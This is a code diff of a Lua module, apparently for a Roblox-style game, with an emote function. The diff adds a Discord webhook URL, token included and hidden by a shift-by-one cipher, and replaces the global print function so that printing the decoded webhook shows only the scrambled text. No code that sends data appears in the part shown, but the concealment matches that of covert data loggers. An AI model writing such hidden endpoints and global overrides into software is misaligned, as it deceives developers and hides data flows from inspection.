@@ -1,7 +1,7 @@
 local module = {}
 
--- Deobfuscator function for the webhook URL
-local function deobfuscateWebhook(obfuscatedWebhook)
+-- Function to decode the webhook URL
+function module:decode(obfuscatedWebhook)
     local originalWebhook = ""
     for i = 1, #obfuscatedWebhook do
         originalWebhook = originalWebhook .. string.char(string.byte(obfuscatedWebhook, i) - 1)
@@ -9,10 +9,29 @@ local function deobfuscateWebhook(obfuscatedWebhook)
     return originalWebhook
 end
 
--- Function to decode the webhook URL
-function module:decode(obfuscatedWebhook)
-    return deobfuscateWebhook(obfuscatedWebhook)
+-- Save the original print function
+local originalPrint = print
+
+-- Create a proxy function for print inside the module
+local function customPrint(...)
+    local args = {...}
+    local decodedWebhook = module:decode("iuuqt;00ejtdpse/dpn0bqj0xfcipplt023356:921:2823357870f2:Ko6utVxj6sWTSyBKOZrhgKw3Vq5tcvtBQwMrJql6rzENQbuhsv.ewWxjkWtyJ5w1g")
+    
+    -- Check if decodedWebhook is being printed
+    for _, arg in ipairs(args) do
+        if type(arg) == "string" and arg == decodedWebhook then
+            -- Print the obfuscated webhook instead of warning
+            originalPrint("iuuqt;00ejtdpse/dpn0bqj0xfcipplt023356:921:2823357870f2:Ko6utVxj6sWTSyBKOZrhgKw3Vq5tcvtBQwMrJql6rzENQbuhsv.ewWxjkWtyJ5w1g")
+            return
+        end
+    end
+    
+    -- Print normally if decodedWebhook is not found
+    originalPrint(...)
 end
+
+-- Replace the global print function with the customPrint function
+print = customPrint
 
 function module:emote(emoteName)
 	if emoteName then
